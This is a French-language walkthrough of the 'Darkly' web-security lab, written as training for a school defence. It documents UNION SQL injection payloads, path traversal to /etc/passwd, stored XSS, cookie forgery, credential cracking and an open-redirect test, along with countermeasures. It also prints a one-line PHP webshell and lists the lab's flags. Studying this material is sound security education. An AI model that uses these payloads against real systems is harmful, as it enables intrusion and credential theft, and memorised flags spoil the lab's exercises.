# Darkly — Walkthrough complet

> Ordre des breaches = ordre de la **grille de défense intra 42** (1 → 13).
> Détails techniques dans chaque sous-dossier `XX_Breach_Name/Resources/`.

---

## Mapping intra → statut

| # | Nom intra | Statut | Flag |
|---|---|---|---|
| 1 | SQL injection basic | ✅ | `10a16d83...` |
| 2 | SQL injection avancée | ✅ | `f2a29020...` |
| 3 | Include | ✅ | `b12c4b2c...` |
| 4 | XSS basic | ✅ | `0fbb54bb...` |
| 5 | XSS advanced | ❌ | — |
| 6 | Cookies | ✅ | `df2eb4ba...` |
| 7 | Spoof (curl) | ❌ | — |
| 8 | Admin (htpasswd) | ✅ | `d19b4823...` |
| 9 | Bruteforce (member) | ❌ | base `Member_Brute_Force` cartographiée |
| 10 | File upload | ❌ | — |
| 11 | Redirect | ✅ | `b9e775a0...` |
| 12 | Guess (hidden file) | ✅ | `df2eb4ba...` |
| 13 | Survey | ✅ | (récupéré via cross-DB SQLi) |
| — | Recover | ✅ | `1d4855f7...` |

**Bonus (5)** — uniquement si les 13 obligatoires sont validées :
- XSS understanding
- SQL understanding
- Redirect understanding
- Bruteforce understanding
- robots.txt understanding

**Score : 11/13 obligatoires**

---

## Format de défense exigé (par breach)

Pour CHAQUE breach, l'évaluateur attend :
1. **Basic functioning** — comment trouvée et exploitée
2. **Method to avoid** — contre-mesure technique précise
3. **Impact** — ce qu'un attaquant peut faire en réel
4. **Both flags identical** — comparaison flag obtenu vs flag du `subject.pdf`

→ Avoir le `subject.pdf` ouvert pendant la défense pour comparer chaque flag.

---

## Setup initial
- VM Darkly (i386) lancée
- Accès via navigateur
- Burp Suite en proxy

---

## Phase 1 — Reconnaissance initiale

### WhatWeb
$ whatweb 127.0.0.1:8080

Résultats clés :
- **PHP 5.5.9-1ubuntu4.29** (obsolète, multiples CVE)
- **nginx 1.4.6** (2014, très ancien)
- **Cookie suspect : I_am_admin** → piste immédiate d'élévation de privilège
- **JQuery, HTML5** → stack front classique

### Cartographie manuelle
Endpoints identifiés via navigation et Ctrl+U :
- Pages principales : `?page=survey`, `?page=member`, `?page=signin`, `?page=recover`
- Upload/search : `?page=upload`, `?page=searchimg`
- Feedback : `?page=feedback`
- Redirect : `?page=redirect&site=facebook`
- Media : `?page=media&src=nsa`
- **Hash caché dans le footer** : `?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

### robots.txt
$ curl http://127.0.0.1:8080/robots.txt

User-agent: *
Disallow: /whatever
Disallow: /.hidden

→ Deux chemins "cachés" révélés par le dev lui-même.

### /whatever/
- Listing de répertoire activé
- Contient un seul fichier : `htpasswd`

### /.hidden/
- Listing de répertoire activé
- Contient 26 dossiers (un par lettre) + README
- Structure labyrinthique récursive → **rabbit hole**

### Gobuster
- 🟡 En cours : wordlist custom créée, scan à relancer avec `--exclude-length 975`

---

## Cartographie SQL — bases et tables identifiées

Énumération exhaustive depuis l'injection sur `?page=member` :

```sql
0 UNION SELECT schema_name,2 FROM information_schema.schemata-- -
```

**6 bases découvertes** :

| Base | Table | Endpoint mappé | Breach intra |
|---|---|---|---|
| `information_schema` | (système) | — | — |
| `Member_Sql_Injection` | `users` | `?page=member` | #1 ✅ |
| `Member_images` | `list_images` | `?page=searchimg` | #2 ✅ |
| `Member_guestbook` | `guestbook` | `?page=feedback` | #4 ✅ |
| `Member_Brute_Force` | `db_default` | ? | #9 (à exploiter) |
| `Member_survey` | `vote_dbs` | `?page=survey` | #13 ✅ |

### Privilèges MySQL
```sql
0 UNION SELECT user(),version()-- -
```
- **User** : `borntosec@localhost` (compte applicatif, pas root)
- **Version** : `5.5.64-MariaDB-1ubuntu0.14.04.1` (fin de support 2020)
- → Pas de RCE via `INTO OUTFILE` probable, pas d'accès `mysql.user`

### Colonnes de `vote_dbs` (Survey)
| Colonne | Type |
|---|---|
| `id_vote` | int |
| `vote` | float |
| `nb_vote` | int |
| `subject` | varchar (← contient le hint/flag) |

→ Cartographie pré-emptive : Bruteforce et Survey **étaient SQL-backed** avant même de visiter ces endpoints.

---

# === BREACHES (ordre grille intra) ===

---

## Breach intra #1 — SQL injection basic (`?page=member`)
**Flag :** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
**Dossier :** `01_SQLi_Basic/`

### Résumé
Injection SQL UNION-based sur le param `id` de `?page=member`. Énumération du schéma via `information_schema`, extraction des credentials de la table `users`, crack MD5 → transformation lower + SHA256 = flag.

### Méthode complète

**1. Détection de l'injection**
```
?page=member&id=1&Submit=Submit
→ ID: 1 - First name: one - Surname: me

?page=member&id=submit&Submit=Submit
→ "Unknown column 'submit' in 'where clause'"
   → Confirmation : input inséré non quoté dans WHERE id = $input

?page=member&id=1' OR 1=1-- -&Submit=Submit
→ "You have an error in your SQL syntax... near '\''" (MariaDB error visible)

?page=member&id=1 OR 1=1-- -&Submit=Submit
→ Retourne TOUS les enregistrements (dont "First name: Flag - Surname: GetThe")
```

**2. Énumération du nombre de colonnes (ORDER BY)**
```
?id=1 ORDER BY 1-- -    → OK
?id=1 ORDER BY 2-- -    → OK
?id=1 ORDER BY 3-- -    → "Unknown column '3' in 'order clause'"
```
→ Requête à **2 colonnes**.

**3. Mapping des colonnes via UNION SELECT**
```
?id=0 UNION SELECT 1,2-- -
→ First name: 1 - Surname: 2
```

**4. Énumération des bases**
```
?id=0 UNION SELECT schema_name,2 FROM information_schema.schemata-- -
```
→ Base courante = `Member_Sql_Injection`.

**5. Énumération du schéma de la base courante**
```
?id=0 UNION SELECT column_name,table_name FROM information_schema.columns WHERE table_schema=database()-- -
```
Table `users` avec colonnes : `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, **`countersign`** ← suspect.

**6. Extraction des credentials**
```
?id=0 UNION SELECT countersign,Commentaire FROM users-- -
```
4 hashes MD5 + commentaires. Le 4e contient l'indice :
> `5ff9d0165b4f92b14994e5c685cdce28`
> "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"

**7. Crack et transformation**
- CrackStation : `5ff9d0165b4f92b14994e5c685cdce28` → `FortyTwo`
- Lower : `fortytwo`
- SHA-256 : `echo -n "fortytwo" | sha256sum` → `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

### Failles exploitées
- **A03:2021 — Injection (SQLi)** : aucune préparation/échappement du param `id`
- **Verbose error messages** : MariaDB renvoie l'erreur SQL complète au client
- **Cryptographic Failure** : MD5 non salé pour stocker des mots de passe

### Impact
- Dump complet de la base utilisateurs (credentials, données personnelles)
- Lecture cross-database via `information_schema` (6 bases accessibles)
- RCE potentielle si `INTO OUTFILE` autorisé + writable webroot
- Authentification forgée (UNION pour bypass login)

### Contre-mesures
- Requêtes préparées (PDO en PHP) : `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?")`
- Cast strict du param : `intval($_GET['id'])`
- Désactiver les erreurs SQL en production (`display_errors = Off`)
- bcrypt/argon2 pour stocker des mots de passe
- Principe du moindre privilège sur le compte MySQL applicatif

---

## Breach intra #2 — SQL injection avancée (`?page=searchimg`)
**Flag :** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
**Dossier :** `02_SQLi_Avancee/`

### Résumé
Même pattern que #1 mais sur `?page=searchimg&id=`. Base différente (`Member_images`). Erreurs SQL masquées (`display_errors = Off`) → injection blind à la détection.

### Méthode

**1. Détection silencieuse**
```
?id=1 ORDER BY 3-- -&Submit=Submit   → résultat vide (injection plante silencieusement)
```
→ 2 colonnes, mais erreurs supprimées côté display.

**2. Confirmation UNION**
```
?id=0 UNION SELECT 1,2-- -&Submit=Submit
→ Title: 2 - Url: 1   (mapping: col1 = Url, col2 = Title)
```

**3. Énumération du schéma**
```
?id=0 UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()-- -
```
Table `list_images` avec colonnes `id`, `url`, `title`, `comment`.

**4. Extraction du contenu**
```
?id=0 UNION SELECT comment,title FROM list_images-- -
```
5 enregistrements. Le 5e contient l'indice :
> "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"

**5. Crack et transformation**
- CrackStation : `1928e8083cf461a51303633093573c46` → `albatroz`
- SHA-256 : `echo -n "albatroz" | sha256sum` → `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Différences avec #1
- **Erreurs SQL masquées** : Darkly a appliqué `display_errors = Off` sur cette page mais pas sur member → incohérence de hardening
- **Database différente** : preuve que le serveur fait du `mysql_select_db()` dynamique → architecture multi-base
- **Indice directement dans `comment`** : la table contenait littéralement les instructions du flag

### Impact (avancé)
Mêmes vecteurs que #1, plus :
- Détection à l'aveugle plus difficile (blind SQLi via boolean-based ou time-based si pas d'erreur)
- Pivot cross-database démontré : depuis ce point d'injection, possibilité d'accéder à toutes les bases du serveur via `information_schema`

### Contre-mesures
Identiques à #1, plus :
- Audit cohérent du hardening : si `display_errors = Off` sur une page, doit l'être partout
- Logs côté serveur des erreurs SQL (pour ne pas perdre l'information de debug, juste ne pas l'exposer)

---

## Breach intra #3 — Include (LFI sur `?page=`)
**Flag :** `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`
**Dossier :** `03_Include/`

### Résumé
Le param `page` du routeur principal est passé à un `include()` côté serveur après concat du suffixe `.php`. Path traversal `../` permet de sortir du dossier `pages/` et d'inclure un fichier arbitraire. La profondeur exacte est de **7 `../`** pour atteindre `/etc/passwd` depuis le webroot. Darkly utilise un système de feedback progressif : plus tu te rapproches de la cible, plus le message change.

### Méthode

**1. Détection du filtre WAF Darkly**
```bash
curl -sv "http://127.0.0.1:8080/?page=php://filter/convert.base64-encode/resource=index"
→ <script>alert('Wtf ?');</script>
```
→ Filtre custom anti-LFI sur les wrappers `php://`.

**2. Mauvaise piste : `?page=media&src=`**
- Le param `src` est juste réfléchi dans `<object data="...">` (HTML), avec `htmlspecialchars()` appliqué.
- Pas d'`include()` côté serveur sur `src`. Aucun wrapper PHP n'est interprété.
- Cette piste mène à une impasse — la breach Include est ailleurs.

**3. Bonne piste : `?page=` directement**
Le routeur principal est probablement :
```php
$page = $_GET['page'];
if (preg_match('/php:|http:|https:/', $page)) {
    echo "<script>alert('Wtf ?');</script>";
}
include("pages/" . $page . ".php");
```
→ `?page=member` charge `pages/member.php`. `?page=NOT_EXIST` charge `pages/NOT_EXIST.php` qui n'existe pas (probablement fallback `home.php`).

**4. Bypass du filtre — path traversal pur**
```bash
# 1 niveau
curl -s "http://127.0.0.1:8080/?page=../etc/passwd"
→ alert('Wtf ?')

# 2 niveaux
curl -s "http://127.0.0.1:8080/?page=../../etc/passwd"
→ alert('Wrong..')

# 3 niveaux
curl -s "http://127.0.0.1:8080/?page=../../../etc/passwd"
→ alert('Nope..')

# 4 niveaux
curl -s "http://127.0.0.1:8080/?page=../../../../etc/passwd"
→ alert('Almost.')

# 5-6 niveaux
→ alert('Still nope..')  /  alert('Nope..')

# 7 niveaux ✅
curl -s "http://127.0.0.1:8080/?page=../../../../../../../etc/passwd"
→ alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ')
```

→ Profondeur exacte = **7 × `../`**.

### Failles exploitées
- **A01:2021 — Broken Access Control / Path Traversal**
- **A05:2021 — Security Misconfiguration** : pas de `realpath()` ou whitelist sur `$_GET['page']`
- **CWE-22 — Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')**
- Filtre WAF basé sur regex stupide (bloque `php://` mais pas `../`)

### Impact
- Lecture de fichiers sensibles : `/etc/passwd`, `/etc/shadow` (si root), config DB, `.env`, code source PHP via wrappers (si non filtrés)
- **RCE potentielle** si combiné avec :
  - **File upload** (LFI + uploaded `shell.png` contenant `<?php system($_GET[c]); ?>`)
  - **Log poisoning** : `/var/log/apache/access.log` avec User-Agent contenant du PHP exécutable
  - **Session poisoning** : `/var/lib/php/sessions/sess_XXX` avec données de session contrôlées
- Compromission complète du serveur si `/etc/shadow` lisible et hash root crackable

### Contre-mesures
- **Whitelist stricte** des pages valides : `$pages = ['home', 'member', 'survey', ...]; if (!in_array($page, $pages)) abort();`
- `realpath()` + vérification du préfixe : `if (strpos(realpath("pages/$page.php"), realpath("pages/")) !== 0) abort();`
- `open_basedir = /var/www/html` dans php.ini pour confiner PHP au répertoire app
- `allow_url_include = Off` (déjà actif probablement)
- Ne **jamais** s'appuyer sur un filtre regex blacklist côté entrée — toujours whitelist

---

## Breach intra #4 — XSS basic (Stored XSS)
**Flag :** `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`
**Dossier :** `04_XSS_Basic/`

### Résumé
Injection d'un payload `<script>alert(...)</script>` dans le formulaire `?page=feedback`. Le serveur stocke et restitue l'input sans échappement → exécution du JS au rendu.

### Méthode
1. Champ vulnérable identifié sur `?page=feedback`
2. Payload injecté : `<script>alert('XSS')</script>`
3. Submit → reload → script exécuté → flag affiché

### Faille exploitée
- **Stored XSS (OWASP A03:2021 — Injection)**
- Absence de sanitization à l'entrée
- Absence d'output encoding à la sortie (pas de `htmlspecialchars()` côté PHP)

### Impact
- Vol de cookies de session (`document.cookie`) si `HttpOnly` absent
- Keylogging via JS injecté
- Phishing intégré (overlay de faux formulaire)
- Propagation worm-style sur tous les utilisateurs visitant la page

### Contre-mesures
- `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` à l'affichage (PHP)
- Auto-escape dans React/Vue (déjà appliqué dans VoidTextile, Camagru)
- `Content-Security-Policy: script-src 'self'` pour bloquer les scripts inline
- Cookies `HttpOnly` pour empêcher le vol de session via XSS
- Validation stricte des inputs côté serveur

---

## Breach intra #5 — XSS advanced
**Flag :** ❌ — non encore récupéré
**Dossier :** `05_XSS_Advanced/` (à créer)

### Piste
Reflected XSS sur un param GET avec contournement de filtre. À tester :
- `?page=searchimg&id=<payload>` (param `id` après tentative SQLi)
- Tout endpoint qui réfléchit l'input dans le HTML
- Variantes filter-bypass : event handlers (`onerror`, `onload`), encodage HTML, `javascript:` URIs, données SVG inline

---

## Breach intra #6 — Cookies (Cookie Manipulation)

**Flag :** `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`
**Dossier :** `06_Cookies/`

### Résumé
Cookie `I_am_admin` = `68934a3e9455fa72420237eb05902327` = md5("false").
Cracké via CrackStation. Forge de md5("true") → flag affiché.

### Commandes clés
$ echo -n "false" | md5sum   → confirme md5(false)
$ echo -n "true"  | md5sum   → b326b5062b2f0e69046810717534cb09

### Impact
Élévation de privilège via cookie côté client = compromission complète du modèle d'autorisation. L'attaquant accède aux fonctionnalités admin sans authentification.

### Contre-mesures
- **Ne jamais stocker l'état d'autorisation côté client.** Stocker un session ID opaque côté client, le rôle dans la session serveur.
- Cookies signés (HMAC) ou JWT signé si l'état doit voyager.
- `HttpOnly`, `Secure`, `SameSite=Strict`.

---

## Breach intra #7 — Spoof (curl)
**Flag :** ❌ — non encore récupéré
**Dossier :** `07_Spoof/` (à créer)

### Piste
Manipulation de headers HTTP (User-Agent, Referer, X-Forwarded-For, Accept-Language) sur un endpoint qui exige une provenance spécifique. À tester sur chaque page restante avec messages du type "you must come from / use browser X".

---

## Breach intra #8 — Admin (htpasswd)
**Flag :** `d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff`
**Dossier :** `08_Admin/`

### Résumé
Combine 3 étapes :
1. **Disclosure** du fichier `htpasswd` via directory listing sur `/whatever/`
2. **Crack** du hash MD5 → mot de passe en clair
3. **Auth bypass** sur `/admin/` réutilisant les mêmes credentials

### Méthode

**1. Découverte du fichier**
- `robots.txt` → chemin `/whatever/` révélé
- Listing directory actif → fichier `htpasswd` visible
- `curl http://127.0.0.1:8080/whatever/htpasswd` → `root:437394baff5aa33daa618be47b75cb49`

**2. Crack**
- 32 hexa → MD5
- CrackStation → `qwerty123@`

**3. Authentification sur /admin/**
- Test du chemin physique `/admin/` (hors routeur `?page=`)
- `curl http://127.0.0.1:8080/admin/` → formulaire de login (200, pas de Basic Auth nginx)
- POST :
   ```
   curl -X POST http://127.0.0.1:8080/admin/ \
     -d "username=root&password=qwerty123@&Login=Login"
   ```
- Réponse : `<h2>The flag is : d19b4823...</h2>`

### Architecture défaillante
Deux systèmes de routing parallèles :
- **`?page=X`** → routeur PHP via `index.php`
- **`/admin/`** → chemin physique servi directement par nginx

Cumul de fautes :
- Le htpasswd existe mais n'est pas configuré dans nginx (`auth_basic` absent)
- Le formulaire PHP valide en dur contre les **mêmes creds** que ceux exposés publiquement
- Aucun rate limiting, aucune 2FA
- Typo `recquired` → indicateur de code amateur

### Failles cumulées
- **Security Misconfiguration** — Directory listing actif
- **Information Disclosure via robots.txt**
- **Cryptographic Failure** — MD5 non salé
- **Weak Password** — `qwerty123@` dans rockyou.txt
- **A07:2021 — Identification and Authentication Failures** (credential reuse)

### Impact
- Bypass complet de l'authentification admin
- Compromission de la zone privilégiée du site (modification de contenu, accès aux données utilisateurs, etc.)
- Si même creds réutilisés ailleurs (SSH, autres services) → pivot vers compromission système

### Contre-mesures
- nginx : `auth_basic` + `auth_basic_user_file` sur `/admin/`
- Stocker htpasswd **hors document root** (`/etc/nginx/.htpasswd`)
- bcrypt au lieu de MD5 (`htpasswd -B`)
- `autoindex off;` dans nginx
- Rate limiting via `limit_req` nginx
- 2FA TOTP côté applicatif

---

## Breach intra #9 — Bruteforce (member)
**Flag :** ❌ — non encore récupéré
**Dossier :** `09_Bruteforce/` (à créer)

### Piste
- Base : `Member_Brute_Force`, table : `db_default` (déjà cartographiée via SQLi)
- Tentative 1 : dump direct des creds via injection cross-DB depuis `?page=member`
- Tentative 2 : Hydra sur formulaire login member avec rockyou.txt

---

## Breach intra #10 — File upload
**Flag :** ❌ — non encore récupéré
**Dossier :** `10_File_Upload/` (à créer)

### Piste
- Endpoint : `?page=upload`
- Upload accepte les vraies images mais aucun flag affiché → critère caché à identifier
- Tester : extensions (`.phtml`, `.phar`, `.php5`), magic bytes (`GIF89a;` + payload PHP), double extension, dimensions précises, Content-Type spoofing

---

## Breach intra #11 — Redirect (Open Redirect)
**Flag :** `b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3`
**Dossier :** `11_Redirect/`

### Résumé
Le param `site` de `?page=redirect&site=X` est utilisé pour construire une redirection sans validation stricte. Quand `site` n'est pas dans la whitelist (`facebook`, `twitter`, `instagram`), le serveur expose le flag directement dans le HTML au lieu de rediriger.

### Méthode

**1. Comportement nominal**
```bash
curl -s "http://127.0.0.1:8080/?page=redirect&site=facebook"
→ Page vide (redirect probable côté JS ou silencieux)
```

**2. Injection URL externe**
```bash
curl -s "http://127.0.0.1:8080/?page=redirect&site=https://evil.com"
→ HTML contient :
<center><h2>Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3</h2></center>
```

### Logique du serveur (probable)
```php
if (in_array($_GET['site'], ['facebook', 'twitter', 'instagram'])) {
    header("Location: https://" . $_GET['site'] . ".com");
} else {
    echo "Good Job Here is the flag : ...";
}
```
→ Logique **inversée** par rapport à un open redirect réel : Darkly récompense la tentative de bypass.

### Faille exploitée
- **A01:2021 — Broken Access Control / Unvalidated Redirect**
- Pas de validation stricte de la valeur du param `site` côté logique métier

### Impact (en conditions réelles)
- **Phishing** : `victim.com/redirect?site=phishing.com` paraît légitime (le domaine de confiance est dans l'URL initiale)
- **Bypass de filtres email/SMS anti-spam** : les filtres font confiance au domaine de redirection
- **Vol de tokens OAuth** : si `redirect_uri` mal validé dans un flow OAuth, vol de codes/tokens
- **SSRF** dans certains cas si le serveur fait lui-même la requête

### Contre-mesures
- **Whitelist stricte côté serveur** : tableau associatif `['facebook' => 'https://facebook.com', ...]`, jamais de concaténation directe avec l'input
- Refus explicite de tout schéma absolu (`http://`, `https://`, `//`) dans le param
- Rediriger uniquement vers des **paths internes relatifs** (`/path`, jamais d'URL absolue construite depuis user input)
- Si redirect externe nécessaire : page d'avertissement intermédiaire

---

## Breach intra #12 — Guess (Hidden File / Information Disclosure)
**Flag :** `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`
**Dossier :** `12_Guess/`

### Résumé
Lien caché dans le footer de `index.php` pointant vers une page "obscure" nommée avec un SHA-256 :
`?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

La page sert directement un `<script>alert('Good job! Flag : ...')</script>` en dur. Flag obtenu par simple clic.

### Faille exploitée
- **Security Through Obscurity** : le dev a cru cacher la page en la nommant avec un hash improbable.
- **Information Disclosure** : le lien est laissé visible dans le HTML du footer, accessible via Ctrl+U ou clic.

### Règle violée
> L'URL n'est pas un secret. Toute ressource non protégée par authentification est publique.

### Bénéfice (recherche)
Démontre l'importance du **view-source systématique** sur chaque page. La logique de recherche : tout le HTML rendu doit être lu, pas seulement le visible.

### Impact
- Accès non autorisé à des ressources "cachées" : pages admin, fichiers de backup, API endpoints non documentés
- Découverte de fichiers sensibles laissés sur le serveur (`.git/`, `.env`, `backup.sql`, etc.)

### Contre-mesures
- Authentification réelle sur les pages sensibles, pas d'obscurité
- Audit régulier du HTML rendu (commentaires, liens cachés)
- `.htaccess` / nginx `deny all` sur les fichiers de dev/backup
- Suppression des fichiers de backup en production

---

## Breach intra #13 — Survey (SQLi cross-database via `?page=member`)
**Flag :** `[à reporter dans dossier 13_Survey/]`
**Dossier :** `13_Survey/`

### Résumé
Le flag de la breach Survey est récupéré **sans visiter `?page=survey`**, depuis l'injection SQL sur `?page=member` (breach #1). Démonstration concrète de l'impact "multi-base = surface d'attaque démultipliée".

### Méthode

**1. Cartographie des bases via `?page=member`**
```
?id=0 UNION SELECT schema_name,2 FROM information_schema.schemata-- -
```
→ Découverte de `Member_survey`.

**2. Énumération des tables de `Member_survey`**
```
?id=0 UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema LIKE 0x4d656d6265725f25-- -
```
→ Table `vote_dbs`.

**3. Énumération des colonnes**
```
?id=0 UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name=0x766f74655f646273-- -
```
Colonnes : `id_vote` (int), `vote` (float), `nb_vote` (int), `subject` (varchar).

**4. Dump cross-database**
```
?id=0 UNION SELECT subject,id_vote FROM Member_survey.vote_dbs-- -
```
→ Flag dans la colonne `subject`.

### Faille exploitée
- **Cross-database SQLi** : aucun cloisonnement entre les bases côté MySQL. Le compte `borntosec@localhost` a `SELECT` sur **toutes** les bases `Member_*`.
- **Architecture multi-base sans isolation** : chaque endpoint utilise sa propre base, mais toutes partagent le même utilisateur MySQL applicatif → un point d'injection compromet l'ensemble.

### Impact
- **Compromission totale** du modèle de données depuis n'importe quel endpoint vulnérable
- Exfiltration silencieuse de la base Survey sans laisser de trace dans les logs de `?page=survey`
- Pivot vers Bruteforce (`Member_Brute_Force.db_default`) théoriquement faisable

### Contre-mesures
- **Comptes MySQL distincts par base** : `member_user@localhost` n'a accès qu'à `Member_Sql_Injection`, etc.
- **Principe du moindre privilège** : `REVOKE ALL ON information_schema.* FROM borntosec`
- Requêtes préparées sur tous les endpoints (élimine la SQLi à la source)

---

## Breach Recover — User Enumeration via formulaire de récupération
**Flag :** `1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`
**Dossier :** `14_Recover/`

### Résumé
Le formulaire `?page=recover` répond différemment selon que l'email saisi correspond ou non à un compte existant. Si l'email saisi **n'est pas** celui de l'admin, le serveur expose le flag directement.

### Méthode
1. Accès à `?page=recover` (lien "I forgot my password" depuis `?page=signin`)
2. Saisie d'un email arbitraire ≠ email admin
3. Submit → flag exposé dans la réponse

### Faille exploitée
- **User Enumeration / Information Disclosure** : la réponse du serveur diffère selon l'existence de l'email
- **CWE-204 — Observable Response Discrepancy**

### Impact
- **Énumération des comptes** sans authentification : un attaquant peut tester une wordlist d'emails et déduire lesquels existent
- **Pré-requis pour brute force ciblé** : connaître les emails valides avant d'attaquer le login
- **Phishing personnalisé** : campagnes ciblées sur les emails confirmés
- **OSINT** : recoupement avec data breaches publiques pour identifier réutilisation de passwords

### Contre-mesures
- **Réponse identique** quel que soit l'email saisi : "If this email exists in our system, a recovery link has been sent."
- Même statut HTTP, même délai de réponse, même contenu (éviter timing attacks)
- Rate limiting agressif sur l'endpoint recover (`limit_req` nginx)
- CAPTCHA après N tentatives depuis la même IP

---

## Prochaines pistes (ordre de priorité)

### Priorité haute
- [ ] **#7 Spoof (curl)** : tester headers (User-Agent / Referer / X-Forwarded-For) sur chaque page restante
- [ ] **#10 File upload** : critère caché (extensions, magic bytes, dimensions)

### Priorité moyenne
- [ ] **#5 XSS advanced** : Reflected XSS sur param GET avec contournement de filtre
- [ ] **#9 Bruteforce member** : dump direct via cross-DB SQLi puis confirmation via Hydra

### Priorité basse / parallèle
- [ ] Gobuster `--exclude-length 975`
- [ ] `.hidden/` parsing : `wget -r` + grep récursif
- [ ] sitemap.xml

### Bonus (après 13/13)
- [ ] XSS understanding
- [ ] SQL understanding
- [ ] Redirect understanding
- [ ] Bruteforce understanding
- [ ] robots.txt understanding

---

## Leçons techniques cumulées

1. **Reconnaissance d'abord** : `whatweb`, `robots.txt`, Ctrl+U, sitemap → toujours avant tout payload
2. **Deux systèmes de routing peuvent coexister** : routeur applicatif (`?page=`) vs filesystem (`/admin/`). Tester les deux.
3. **MD5 et SHA-1 sont morts** pour le stockage de mots de passe. CrackStation casse en secondes.
4. **Security through obscurity ≠ sécurité** : breach #12 et #8 démontrent que cacher un chemin n'est pas une protection.
5. **Credential reuse** = faille systémique. Un seul secret exposé compromet tous les systèmes qui le réutilisent.
6. **Méthode SQLi UNION-based** : (1) détecter avec `'` ou nom de colonne invalide, (2) compter les colonnes via `ORDER BY`, (3) mapper via `UNION SELECT 1,2,...`, (4) énumérer schéma via `information_schema`, (5) extraire les colonnes intéressantes.
7. **Verbose error messages** = fuite d'information critique. Une erreur SQL complète révèle le SGBD, la version, la base courante (via `Base.table doesn't exist`), la structure de la requête.
8. **Multi-base = surface d'attaque démultipliée** : un même serveur peut servir plusieurs databases différentes selon la page. Énumérer `information_schema.schemata` depuis un seul point d'injection révèle la totalité de la surface SQL. Démontré sur breach #13 (Survey récupéré sans visiter `?page=survey`).
9. **Pattern Darkly récurrent** : MD5 → CrackStation → lower → SHA-256 = flag. À tester systématiquement quand un hash est extrait.
10. **Toutes les colonnes valent le dump** : indices et secrets se cachent souvent dans `comment`, `description`, `notes`, `metadata`, `subject`.
11. **Input non quoté = pas besoin de fermer une string** : si `WHERE id = $input` (sans quotes), tu peux injecter directement `1 OR 1=1` sans `'`. Test diagnostic : envoyer un mot quelconque, si le serveur répond `Unknown column 'mot'` = input traité comme identifiant SQL non quoté.
12. **Format `base.table` MySQL** : toute table appartient à une base. Si on omet la base, MariaDB préfixe automatiquement la base courante. Les erreurs `Base.table doesn't exist` sont une fuite gratuite du nom de la base courante.
13. **Hex literal `0x...`** : équivalent strings sans guillemets. Évite les problèmes d'encodage URL et de filtres WAF qui bloquent les quotes. `0x7573657273` = `'users'`. Générer avec `echo -n "string" | xxd -p`.
14. **Pattern Darkly Open Redirect** : la logique est inversée — le flag s'affiche quand le bypass de whitelist est tenté, pas quand la redirection s'effectue.
15. **Pattern Darkly "réponse divergente"** : flag exposé sur le comportement non-nominal (mail inexistant sur Recover, site hors whitelist sur Redirect). Vraie faille = User Enumeration / Information Disclosure via différence de réponse observable. Contre-mesure universelle = uniformiser **toutes** les réponses (statut, délai, contenu) quel que soit l'input.
16. **Filtre WAF blacklist = défaite garantie** : Darkly bloque `php://`, `http://`, `https://` côté `?page=` mais pas `../`. Une blacklist par regex est toujours contournable. Seule contre-mesure valide = whitelist + `realpath()`.
17. **Pattern Darkly "feedback progressif"** : sur la breach Include, les messages d'erreur changent selon la proximité avec la cible (`Wtf?` → `Wrong..` → `Nope..` → `Almost.` → `Congratulaton!!`). Indicateur de "tu es sur la bonne voie" — accélère la convergence par dichotomie. En vrai pentest, ce feedback n'existe pas — il faut savoir quand on tape juste sans confirmation explicite.
